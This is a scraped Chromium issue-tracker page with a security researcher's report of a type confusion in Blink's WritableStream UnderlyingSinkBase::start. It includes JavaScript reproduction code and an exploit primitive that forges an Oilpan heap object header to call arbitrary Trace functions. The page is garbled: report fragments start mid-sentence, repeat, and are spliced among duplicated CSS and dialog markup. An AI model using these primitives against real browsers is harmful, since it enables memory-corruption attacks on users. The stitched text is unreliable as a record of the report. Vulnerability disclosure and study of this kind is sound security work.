(DOMUint8Array).<span class="line"><!---->it with a DOMArrayBufferView; it has the base pointer, offset, and length (DOMUint8Array).<!----></span><br><br>We set offset=length=0, and base pointer becomes a Member<> by type confusion, which is Traced later.<span class="line"><!---->We set offset=length=0, and base pointer becomes a Member&lt;&gt; by type confusion, which is Traced later.<!----></span><br>The following code creates a fake oilpan chunk.<span class="line"><!---->The following code creates a fake oilpan chunk.<!----></span><br><br>size=0x18; // size of the object<span class="line"><!---->size=0x18; // size of the object<!----></span><br>index=520; // GCInfoIndex<span class="line"><!---->index=520; // GCInfoIndex<!----></span><br>in_construction=1;<span class="line"><!---->in_construction=1;<!----></span><br>marked=0;<span class="line"><!---->marked=0;<!----></span><br>// u32 is followed by a, there's no gap between them<span class="line"><!---->// u32 is followed by a, there's no gap between them<!----></span><br>// So a[-1] becomes HeapObjectHeader of &u32.data()<span class="line"><!---->// So a[-1] becomes HeapObjectHeader of &amp;u32.data()<!----></span><br>(a=new BigInt64Array(0x10>>2)).fill(BigInt(((size/8)<<17)|(marked<<16)|(index<<2)|(0<<1)|in_construction)<<32n)<span class="line"><!---->(a=new BigInt64Array(0x10&gt;&gt;2)).fill(BigInt(((size/8)&lt;&lt;17)|(marked&lt;&lt;16)|(index&lt;&lt;2)|(0&lt;&lt;1)|in_construction)&lt;&lt;32n)<!----></span><br>u32 = new BigInt64Array(0x10>>2)<span class="line"><!---->u32 = new BigInt64Array(0x10&gt;&gt;2)<!----></span><br>u32.fill(0n);<span class="line"><!---->u32.fill(0n);<!----></span><br>// Get DOMArrayBufferView-based Uint8Array, not just plain Uint8Array<span class="line"><!---->// Get DOMArrayBufferView-based Uint8Array, not just plain Uint8Array<!----></span><br>u8=(new MIDIMessageEvent('',{data:new Uint8Array(u32.buffer,0,0)})).data<span class="line"><!---->u8=(new MIDIMessageEvent('',{data:new Uint8Array(u32.buffer,0,0)})).data<!----></span><br>// Trigger<span class="line"><!---->// Trigger<!----></span><br>this.start(u8)<span class="line"><!---->this.start(u8)<!----></span><br>// GC<span class="line"><!---->// GC<!----></span><br>new ArrayBuffer(0x10000000)<span class="line"><!---->new ArrayBuffer(0x10000000)<!----></span><br><br>By changing index, we can call any Trace function on u32.data().<span class="line"><!---->By changing index, we can call any Trace function on u32.data().<!----></span><br>Also we can see a[-1] changed because of marking.<span class="line"><!---->Also we can see a[-1] changed because of marking.<!----></span><br><br>FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION<b class="line"><!---->FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION<!----></b><br>Type of crash: tab<span class="line"><!---->Type of crash: tab<!----></span><br>Crash State: See crash.txt for min.html<span class="line"><!---->Crash State: See crash.txt for min.html<!----></span><br><br>CREDIT INFORMATION<b class="line"><!---->CREDIT INFORMATION<!----></b><br>Reporter credit: Yonghwi Jin (@jinmo123) of Theori<span class="line"><!---->Reporter credit: Yonghwi Jin (@jinmo123) of Theori<!----></span><mr-comment-content></mr-comment-content>

If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.<span class="line"><!---->6.         *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<!----></span><br><br>Please contact <span class="line"><!---->Please contact <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a> with any questions.<span class="line"><!----> with any questions.<!----></span><br>******************************<span class="line"><!---->******************************<!----></span><mr-comment-content></mr-comment-content>

           issue<h3 class="medium-heading"><!----> issue</h3>
          
            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

              <mr-autocomplete vocabularyname="project" for="targetProjectInput" role="listbox" id="chops-autocomplete-1"><!---->
      <style>
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }
      </style>
      <div class="chops-autocomplete-container">
        <span class="screenreader-hidden" aria-live="polite">
          
        </span>
        <table hidden="">
          <tbody>
            
          </tbody>
        </table>
      </div>
    <!----></mr-autocomplete>
            </div>
          </div>

       Note: Avoiding 2-way data binding to futureproof this code
        for LitElement. 
      <input id="checkbox" type="checkbox">

    <mr-issue-page issueclosed=""><!---->
      <style>
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }
      </style>

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

      
      
        
          <slot></slot>
        <div class="dialog-content">
          <slot></slot>
        </div>
      <dialog class="dialog" role="dialog">
        <div class="dialog-content">
          <slot></slot>
        </div>
      </dialog>
    
        This site hosts public issues in public projects<h2>This site hosts public issues in public projects</h2>

        Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.<p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.<p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="corpModeDialog" forced="">
        <h2>This site hosts public issues in public projects</h2>

        <p>Unlike our internal issue tracker, this site makes most
        issues public, unless the issue is labeled with a Restrict-View-*
        label, such as Restrict-View-Google.</p>

        <p>Components are not used for permissions.  And, regardless of
        restriction labels, the issue reporter, owner,
        and Cc'd users may always view the issue.</p>

        

        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>

      </div>
      VULNERABILITY DETAILS<b class="line"><!---->VULNERABILITY DETAILS<!----></b><br>When constructing WritableStreams, UnderlyingSinkBase can be exposed<span class="line"><!---->When constructing WritableStreams, UnderlyingSinkBase can be exposed<!----></span><br>by setting getter for "type" [ref-wr], and UnderlyingSinkBase::start<span class="line"><!---->by setting getter for "type" [ref-wr], and UnderlyingSinkBase::start<!----></span><br>accepts arbitrary v8 value as argument, which is converted to<span class="line"><!---->accepts arbitrary v8 value as argument, which is converted to<!----></span><br>WritableStreamDefaultController without type checks [ref-vuln].<span class="line"><!---->WritableStreamDefaultController without type checks [ref-vuln].<!----></span><br><br>  ScriptPromise start(ScriptState* script_state,<span class="line"><!---->  ScriptPromise start(ScriptState* script_state,<!----></span><br>                      ScriptValue controller,<span class="line"><!---->                      ScriptValue controller,<!----></span><br>                      ExceptionState& exception_state) {<span class="line"><!---->                      ExceptionState&amp; exception_state) {<!----></span><br>    controller_ = WritableStreamDefaultController::From(controller); <--<span class="line"><!---->    controller_ = WritableStreamDefaultController::From(controller); &lt;--<!----></span><br>    return start(script_state, controller_, exception_state);<span class="line"><!---->    return start(script_state, controller_, exception_state);<!----></span><br>  }<span class="line"><!---->  }<!----></span><br><br>This allows setting the `controller_` field to an arbitrary pointer.<span class="line"><!---->This allows setting the `controller_` field to an arbitrary pointer.<!----></span><br><br>Note that UnderlyingSourceBase also have the same pattern, but I couldn't get that object,<span class="line"><!---->Note that UnderlyingSourceBase also have the same pattern, but I couldn't get that object,<!----></span><br>because "type" are already defined there.<span class="line"><!---->because "type" are already defined there.<!----></span><br><br>[ref-wr]: <span class="line"><!---->[ref-wr]: <!----></span>https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/writable_stream.cc;l=926;drc=516f8d8dd33f3c7eb7554be8c43d5e238a743482<a class="undefined" target="_blank" href="https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/writable_stream.cc;l=926;drc=516f8d8dd33f3c7eb7554be8c43d5e238a743482"><!---->https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/writable_stream.cc;l=926;drc=516f8d8dd33f3c7eb7554be8c43d5e238a743482<!----></a><br>[ref-vuln]: <span class="line"><!---->[ref-vuln]: <!----></span>https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/underlying_sink_base.h;l=44;drc=052831f0220b79fe0c3343b49f6d2863ea6de05d<a class="undefined" target="_blank" href="https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/underlying_sink_base.h;l=44;drc=052831f0220b79fe0c3343b49f6d2863ea6de05d"><!---->https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/streams/underlying_sink_base.h;l=44;drc=052831f0220b79fe0c3343b49f6d2863ea6de05d<!----></a><br><br>VERSION<b class="line"><!---->VERSION<!----></b><br>Chrome Version: 95.0.4638.54 stable<span class="line"><!---->Chrome Version: 95.0.4638.54 stable<!----></span><br>Operating System: Windows 10 21H1 x64<span class="line"><!---->Operating System: Windows 10 21H1 x64<!----></span><br><br>REPRODUCTION CASE<b class="line"><!---->REPRODUCTION CASE<!----></b><br>1. The following code (min.html) crashes on 0x828282 because it tries to interpret a Smi value as object pointer:<span class="line"><!---->1. The following code (min.html) crashes on 0x828282 because it tries to interpret a Smi value as object pointer:<!----></span><br><br>  Object.prototype.__defineGetter__('type', function() {<span class="line"><!---->  Object.prototype.__defineGetter__('type', function() {<!----></span><br>      this.start(0x414141) // crashes on: 0x828282<span class="line"><!---->      this.start(0x414141) // crashes on: 0x828282<!----></span><br>  })<span class="line"><!---->  })<!----></span><br>  generator = new MediaStreamTrackGenerator('video')<span class="line"><!---->  generator = new MediaStreamTrackGenerator('video')<!----></span><br>  const wr = generator.writable<span class="line"><!---->  const wr = generator.writable<!----></span><br><br>2. The following code for the getter above fills all members of WritableStreamDefaultController<span class="line"><!---->2. The following code for the getter above fills all members of WritableStreamDefaultController<!----></span><br>with arbitrary value by confusing with DOMMatrixReadOnly.<span class="line"><!---->with arbitrary value by confusing with DOMMatrixReadOnly.<!----></span><br><br>  f64 = new Float64Array(16)<span class="line"><!---->  f64 = new Float64Array(16)<!----></span><br>  (new BigInt64Array(f64.buffer)).fill(0x41414141)<span class="line"><!---->  (new BigInt64Array(f64.buffer)).fill(0x41414141)<!----></span><br>  this.start(new DOMMatrixReadOnly(f64))<span class="line"><!---->  this.start(new DOMMatrixReadOnly(f64))<!----></span><br><br>Given an information leak such as <span class="line"><!---->Given an information leak such as <!----></span>crbug.com/1144662<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1144662" title="Bypassing ASLR using Oilpan’s conservative garbage collector"><!---->crbug.com/1144662<!----></a>, it's possible<span class="line"><!---->, it's possible<!----></span><br>to call an arbitrary function using this primitive.<span class="line"><!---->to call an arbitrary function using this primitive.<!----></span><br><br>3. Since there are multiple Member<> oilpan pointers in the target object, we can confuse<span class="line"><!---->3. Since there are multiple Member&lt;&gt; oilpan pointers in the target object, we can confuse<!----></span><br>it with a DOMArrayBufferView; it has the base pointer, offset, and length (DOMUint8Array).<span class="line"><!---->it with a DOMArrayBufferView; it has the base pointer, offset, and length (DOMUint8Array).<!----></span><br><br>We set offset=length=0, and base pointer becomes a Member<> by type confusion, which is Traced later.<span class="line"><!---->We set offset=length=0, and base pointer becomes a Member&lt;&gt; by type confusion, which is Traced later.<!----></span><br>The following code creates a fake oilpan chunk.<span class="line"><!---->The following code creates a fake oilpan chunk.<!----></span><br><br>size=0x18; // size of the object<span class="line"><!---->size=0x18; // size of the object<!----></span><br>index=520; // GCInfoIndex<span class="line"><!---->index=520; // GCInfoIndex<!----></span><br>in_construction=1;<span class="line"><!---->in_construction=1;<!----></span><br>marked=0;<span class="line"><!---->marked=0;<!----></span><br>// u32 is followed by a, there's no gap between them<span class="line"><!---->// u32 is followed by a, there's no gap between them<!----></span><br>// So a[-1] becomes HeapObjectHeader of &u32.data()<span class="line"><!---->// So a[-1] becomes HeapObjectHeader of &amp;u32.data()<!----></span><br>(a=new BigInt64Array(0x10>>2)).fill(BigInt(((size/8)<<17)|(marked<<16)|(index<<2)|(0<<1)|in_construction)<<32n)<span class="line"><!---->(a=new BigInt64Array(0x10&gt;&gt;2)).fill(BigInt(((size/8)&lt;&lt;17)|(marked&lt;&lt;16)|(index&lt;&lt;2)|(0&lt;&lt;1)|in_construction)&lt;&lt;32n)<!----></span><br>u32 = new BigInt64Array(0x10>>2)<span class="line"><!---->u32 = new BigInt64Array(0x10&gt;&gt;2)<!----></span><br>u32.fill(0n);<span class="line"><!---->u32.fill(0n);<!----></span><br>// Get DOMArrayBufferView-based Uint8Array, not just plain Uint8Array<span class="line"><!---->// Get DOMArrayBufferView-based Uint8Array, not just plain Uint8Array<!----></span><br>u8=(new MIDIMessageEvent('',{data:new Uint8Array(u32.buffer,0,0)})).data<span class="line"><!---->u8=(new MIDIMessageEvent('',{data:new Uint8Array(u32.buffer,0,0)})).data<!----></span><br>// Trigger<span class="line"><!---->// Trigger<!----></span><br>this.start(u8)<span class="line"><!---->this.start(u8)<!----></span><br>// GC<span class="line"><!---->// GC<!----></span><br>new ArrayBuffer(0x10000000)<span class="line"><!---->new ArrayBuffer(0x10000000)<!----></span><br><br>By changing index, we can call any Trace function on u32.data().<span class="line"><!---->By changing index, we can call any Trace function on u32.data().<!----></span><br>Also we can see a[-1] changed because of marking.<span class="line"><!---->Also we can see a[-1] changed because of marking.<!----></span><br><br>FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION<b class="line"><!---->FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION<!----></b><br>Type of crash: tab<span         *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<!----></span><br><br>Please contact <span class="line"><!---->Please contact <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a> with any questions.<span class="line"><!----> with any questions.<!----></span><br>******************************<span class="line"><!---->******************************<!----></span><mr-comment-content></mr-comment-content>
        
          
        <div>
          
        </div>
      <div class="comment-body">
        <mr-comment-content></mr-comment-content>
        <div>
          
        </div>
      </div>

           issue<h3 class="medium-heading"><!----> issue</h3>
          
            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

        for LitElement.

          max-width: 1000px;
          flex-grow: 1;

          padding-right: var(--mr-issue-page-horizontal-padding);

          overflow-y: auto;

        }

      <style>
        mr-issue-page {
          --mr-issue-page-horizontal-padding: 12px;
          --mr-toggled-font-family: inherit;
          --monorail-metadata-toggled-bg: var(--monorail-metadata-open-bg);
        }
        mr-issue-page[issueClosed] {
          --monorail-metadata-toggled-bg: var(--monorail-metadata-closed-bg);
        }
        mr-issue-page[codeFont] {
          --mr-toggled-font-family: Monospace;
        }
        .container-issue {
          width: 100%;
          flex-direction: column;
          align-items: stretch;
          justify-content: flex-start;
          z-index: 200;
        }
        .container-issue-content {
          padding: 0;
          flex-grow: 1;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: nowrap;
          box-sizing: border-box;
          padding-top: 0.5em;
        }
        .container-outside {
          box-sizing: border-box;
          width: 100%;
          max-width: 100%;
          margin: auto;
          padding: 0;
          display: flex;
          align-items: stretch;
          justify-content: space-between;
          flex-direction: row;
          flex-wrap: no-wrap;
        }
        .container-no-issue {
          padding: 0.5em 16px;
          font-size: var(--chops-large-font-size);
        }
        .metadata-container {
          font-size: var(--chops-main-font-size);
          background: var(--monorail-metadata-toggled-bg);
          border-right: var(--chops-normal-border);
          border-bottom: var(--chops-normal-border);
          width: 24em;
          min-width: 256px;
          flex-grow: 0;
          flex-shrink: 0;
          box-sizing: border-box;
          z-index: 100;
        }
        .issue-header-container {
          z-index: 10;
          position: sticky;
          top: var(--monorail-header-height);
          margin-bottom: 0.25em;
          width: 100%;
        }
        mr-issue-details {
          min-width: 50%;
          max-width: 1000px;
          flex-grow: 1;
          box-sizing: border-box;
          min-height: 100%;
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
        }
        mr-issue-metadata {
          position: sticky;
          overflow-y: auto;
          top: var(--monorail-header-height);
          height: calc(100vh - var(--monorail-header-height));
        }
        mr-launch-overview {
          border-left: var(--chops-normal-border);
          padding-left: var(--mr-issue-page-horizontal-padding);
          padding-right: var(--mr-issue-page-horizontal-padding);
          flex-grow: 0;
          flex-shrink: 0;
          width: 50%;
          box-sizing: border-box;
          min-height: 100%;
        }
        @media (max-width: 1126px) {
          .container-issue-content {
            flex-direction: column;
            padding: 0 var(--mr-issue-page-horizontal-padding);
          }
          mr-issue-details, mr-launch-overview {
            width: 100%;
            padding: 0;
            border: 0;
          }
        }
        @media (max-width: 840px) {
          .container-outside {
            flex-direction: column;
          }
          .metadata-container {
            width: 100%;
            height: auto;
            border: 0;
            border-bottom: var(--chops-normal-border);
          }
          mr-issue-metadata {
            min-width: auto;
            max-width: auto;
            width: 100%;
            padding: 0;
            min-height: 0;
            border: 0;
          }
          mr-issue-metadata, .issue-header-container {
            position: static;
          }
        }
      </style>

        <div class="dialog-content">

        Email display settings<h2>Email display settings</h2>

        There is a setting<a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.<p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.<p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        If you do not wish your email address to be shared, there
        are other ways to get
        involved<a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.<p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        
          
      
        <slot></slot>
      <button>
        <slot></slot>
      </button>
    
            Got it
          <chops-button>
            Got it
          </chops-button>
        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      <chops-dialog id="privacyDialog" forced="">
        <h2>Email display settings</h2>

        <p>There is a <a href="/hosting/settings">setting</a> to control how
        your email address appears on comments and issues that you post.</p>

        <p>Project members will always see your full email address.  By
        default, other users who visit the site will see an
        abbreviated version of your email address.</p>

        <p>If you do not wish your email address to be shared, there
        are other ways to <a href="http://www.chromium.org/getting-involved">get
        involved</a> in the community.  To report a problem when using
        the Chrome browser, you may use the "Report an issue..."  item
        on the "Help" menu.</p>


        <div class="edit-actions">
          <chops-button>
            Got it
          </chops-button>
        </div>
      </chops-dialog>

        <div class="dialog-content">
          <slot></slot>
        </div>
